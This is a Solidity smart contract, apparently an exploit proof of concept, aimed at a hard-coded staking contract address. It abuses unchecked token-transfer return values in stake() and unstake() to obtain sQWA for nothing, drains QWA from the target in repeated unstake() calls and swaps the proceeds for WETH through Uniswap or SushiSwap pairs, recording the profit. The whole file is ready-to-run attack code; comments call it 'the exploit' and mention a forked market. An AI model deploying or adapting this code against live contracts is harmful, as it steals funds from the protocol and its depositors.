// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IStakingLike {
    function QWA() external view returns (address);

    function sQWA() external view returns (address);

    function stake(address to, uint256 amount) external;

    function unstake(address to, uint256 amount, bool rebase_) external;
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x69422c7F237D70FCd55C218568a67d00dc4ea068;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private constant PATH_STAKE_FALSE_RETURN = 1 << 0;
    uint256 private constant PATH_UNSTAKE_FALSE_RETURN = 1 << 1;
    uint256 private constant PATH_STAKE_OUTGOING_FALSE = 1 << 2;
    uint256 private constant PATH_UNSTAKE_OUTGOING_FALSE = 1 << 3;

    uint256 private constant FAIL_NO_QWA_WETH_PAIR = 1 << 0;
    uint256 private constant FAIL_STAKE_PROBE_REVERTED = 1 << 1;
    uint256 private constant FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 2;
    uint256 private constant FAIL_UNSTAKE_PROBE_REVERTED = 1 << 3;
    uint256 private constant FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED = 1 << 4;
    uint256 private constant FAIL_WETH_SWAP_FAILED = 1 << 5;

    address private _profitToken;
    uint256 private _profitAmount;

    uint256 public pathFlags;
    uint256 public failureFlags;
    bool public hypothesisValidated;
    bool public executed;

    constructor() {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        IStakingLike staking = IStakingLike(TARGET);
        address qwaAddr = staking.QWA();
        address sqwaAddr = staking.sQWA();

        IERC20Like qwa = IERC20Like(qwaAddr);
        IERC20Like sqwa = IERC20Like(sqwaAddr);

        uint256 initialWeth = IERC20Like(WETH).balanceOf(address(this));
        uint256 initialQwa = qwa.balanceOf(address(this));
        uint256 initialSqwa = sqwa.balanceOf(address(this));

        _executeDirectMintAndDrain(qwaAddr, sqwaAddr);
        _finalizeProfit(qwaAddr, sqwaAddr, initialQwa, initialSqwa, initialWeth);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _executeDirectMintAndDrain(address qwaAddr, address sqwaAddr) internal {
        IERC20Like qwa = IERC20Like(qwaAddr);
        IERC20Like sqwa = IERC20Like(sqwaAddr);
        address pair = _findQwaWethPair(qwaAddr);

        uint256 seedAmount = _selectSeedAmount(
            pair,
            qwaAddr,
            qwa.balanceOf(TARGET),
            sqwa.balanceOf(TARGET)
        );
        if (seedAmount == 0) {
            failureFlags |= FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED;
            return;
        }

        uint256 mintedSqwa = _probeUncheckedStake(qwa, sqwa, seedAmount);
        if (mintedSqwa == 0) {
            return;
        }

        // Keep the exploit rooted in the listed causality:
        // 1. `stake()` continues after a failed QWA transferFrom and hands out sQWA.
        // 2. The same sQWA position is then reused through repeated `unstake()` calls
        //    without approving the staking contract, so each failed sQWA transferFrom
        //    is ignored and another tranche of QWA is released.
        uint256 drained = _drainUncheckedUnstake(qwa, sqwa, qwaAddr, pair, mintedSqwa);
        if (drained == 0) {
            return;
        }

        if (pair != address(0)) {
            _sellQwaForWethSupportingFeeOnTransfer(pair, qwaAddr, qwa.balanceOf(address(this)));
        } else {
            failureFlags |= FAIL_NO_QWA_WETH_PAIR;
        }
    }

    function _probeUncheckedStake(
        IERC20Like qwa,
        IERC20Like sqwa,
        uint256 amount
    ) internal returns (uint256 mintedSqwa) {
        uint256 qwaBefore = qwa.balanceOf(address(this));
        uint256 sqwaBefore = sqwa.balanceOf(address(this));

        (bool ok, ) = TARGET.call(
            abi.encodeWithSelector(IStakingLike.stake.selector, address(this), amount)
        );

        uint256 qwaAfter = qwa.balanceOf(address(this));
        uint256 sqwaAfter = sqwa.balanceOf(address(this));

        if (!ok) {
            failureFlags |= FAIL_STAKE_PROBE_REVERTED;
            return 0;
        }

        if (sqwaAfter > sqwaBefore && qwaAfter == qwaBefore) {
            pathFlags |= PATH_STAKE_FALSE_RETURN;
            hypothesisValidated = true;
            return sqwaAfter - sqwaBefore;
        }

        if (sqwaAfter == sqwaBefore && qwaAfter < qwaBefore) {
            pathFlags |= PATH_STAKE_OUTGOING_FALSE;
        }

        failureFlags |= FAIL_STAKE_FALSE_RETURN_NOT_OBSERVED;
        return 0;
    }

    function _drainUncheckedUnstake(
        IERC20Like qwa,
        IERC20Like sqwa,
        address qwaAddr,
        address pair,
        uint256 tranche
    ) internal returns (uint256 drained) {
        if (tranche == 0) {
            return 0;
        }

        uint256 targetQwaBalance = qwa.balanceOf(TARGET);
        if (targetQwaBalance < tranche) {
            tranche = targetQwaBalance;
        }
        if (tranche == 0) {
            return 0;
        }

        uint256 maxDrain = targetQwaBalance;
        if (pair != address(0)) {
            (uint256 reserveIn, ) = _pairReserves(pair, qwaAddr);
            uint256 exitBound = reserveIn / 2;
            if (exitBound != 0 && exitBound < maxDrain) {
                maxDrain = exitBound;
            }
        }

        uint256 maxLoops = maxDrain / tranche;
        if (maxLoops == 0) {
            maxLoops = 1;
        }
        if (maxLoops > 16) {
            maxLoops = 16;
        }

        for (uint256 i = 0; i < maxLoops; ++i) {
            if (qwa.balanceOf(TARGET) < tranche) {
                break;
            }

            uint256 qwaBefore = qwa.balanceOf(address(this));
            uint256 sqwaBefore = sqwa.balanceOf(address(this));

            (bool ok, ) = TARGET.call(
                abi.encodeWithSelector(IStakingLike.unstake.selector, address(this), tranche, false)
            );

            uint256 qwaAfter = qwa.balanceOf(address(this));
            uint256 sqwaAfter = sqwa.balanceOf(address(this));

            if (!ok) {
                if (drained == 0) {
                    failureFlags |= FAIL_UNSTAKE_PROBE_REVERTED;
                }
                break;
            }

            if (qwaAfter > qwaBefore && sqwaAfter == sqwaBefore) {
                pathFlags |= PATH_UNSTAKE_FALSE_RETURN;
                hypothesisValidated = true;
                drained += qwaAfter - qwaBefore;
                continue;
            }

            if (qwaAfter == qwaBefore && sqwaAfter < sqwaBefore) {
                pathFlags |= PATH_UNSTAKE_OUTGOING_FALSE;
            }

            if (drained == 0) {
                failureFlags |= FAIL_UNSTAKE_FALSE_RETURN_NOT_OBSERVED;
            }
            break;
        }
    }

    function _findQwaWethPair(address qwa) internal view returns (address) {
        address pair = IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(qwa, WETH);
        if (pair != address(0)) {
            return pair;
        }

        return IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(qwa, WETH);
    }

    function _selectSeedAmount(
        address pair,
        address qwa,
        uint256 targetQwaBalance,
        uint256 stakingSqwaBalance
    ) internal view returns (uint256 amount) {
        if (targetQwaBalance == 0 || stakingSqwaBalance == 0) {
            return 0;
        }

        uint256 contractBound = _min(targetQwaBalance / 16, stakingSqwaBalance / 16);
        if (contractBound == 0) {
            contractBound = _min(targetQwaBalance, stakingSqwaBalance);
        }

        if (pair == address(0)) {
            return contractBound;
        }

        (uint256 reserveIn, ) = _pairReserves(pair, qwa);
        if (reserveIn <= 32) {
            return _min(contractBound, reserveIn);
        }

        // Bound the seeded fake receipt position by public exit liquidity so the
        // eventual QWA -> WETH unwind stays realizable on the forked market.
        uint256 marketBound = reserveIn / 32;
        amount = _min(contractBound, marketBound);

        if (amount == 0) {
            amount = 1;
        }
    }

    function _sellQwaForWethSupportingFeeOnTransfer(address pair, address qwaAddr, uint256 grossAmount) internal {
        if (grossAmount == 0) {
            return;
        }

        (address token0, address token1) = _sortPairTokens(pair);
        if (!((token0 == qwaAddr && token1 == WETH) || (token0 == WETH && token1 == qwaAddr))) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
            return;
        }

        (uint256 reserveIn, uint256 reserveOut) = _pairReserves(pair, qwaAddr);
        if (reserveIn == 0 || reserveOut == 0) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
            return;
        }

        if (!IERC20Like(qwaAddr).transfer(pair, grossAmount)) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
            return;
        }

        uint256 pairBalance = IERC20Like(qwaAddr).balanceOf(pair);
        if (pairBalance <= reserveIn) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
            return;
        }

        uint256 actualIn = pairBalance - reserveIn;
        uint256 amountOut = _getAmountOut(actualIn, reserveIn, reserveOut);
        if (amountOut == 0) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
            return;
        }

        (uint256 amount0Out, uint256 amount1Out) = qwaAddr == token0
            ? (uint256(0), amountOut)
            : (amountOut, uint256(0));

        (bool ok, ) = pair.call(
            abi.encodeWithSelector(IUniswapV2PairLike.swap.selector, amount0Out, amount1Out, address(this), new bytes(0))
        );
        if (!ok) {
            failureFlags |= FAIL_WETH_SWAP_FAILED;
        }
    }

    function _finalizeProfit(
        address qwaAddr,
        address sqwaAddr,
        uint256 initialQwa,
        uint256 initialSqwa,
        uint256 initialWeth
    ) internal {
        uint256 wethFinal = IERC20Like(WETH).balanceOf(address(this));
        uint256 qwaFinal = IERC20Like(qwaAddr).balanceOf(address(this));
        uint256 sqwaFinal = IERC20Like(sqwaAddr).balanceOf(address(this));

        uint256 wethProfit = wethFinal > initialWeth ? wethFinal - initialWeth : 0;
        uint256 qwaProfit = qwaFinal > initialQwa ? qwaFinal - initialQwa : 0;
        uint256 sqwaProfit = sqwaFinal > initialSqwa ? sqwaFinal - initialSqwa : 0;

        if (wethProfit > 0) {
            _profitToken = WETH;
            _profitAmount = wethProfit;
        } else if (qwaProfit > 0) {
            _profitToken = qwaAddr;
            _profitAmount = qwaProfit;
        } else if (sqwaProfit > 0) {
            _profitToken = sqwaAddr;
            _profitAmount = sqwaProfit;
        }
    }

    function _pairReserves(address pair, address tokenIn) internal view returns (uint256 reserveIn, uint256 reserveOut) {
        (uint112 reserve0, uint112 reserve1, ) = IUniswapV2PairLike(pair).getReserves();
        (address token0, address token1) = _sortPairTokens(pair);

        if (tokenIn == token0) {
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else {
            require(tokenIn == token1, "token not in pair");
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        }
    }

    function _sortPairTokens(address pair) internal view returns (address token0, address token1) {
        token0 = IUniswapV2PairLike(pair).token0();
        token1 = IUniswapV2PairLike(pair).token1();
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        return numerator / denominator;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}
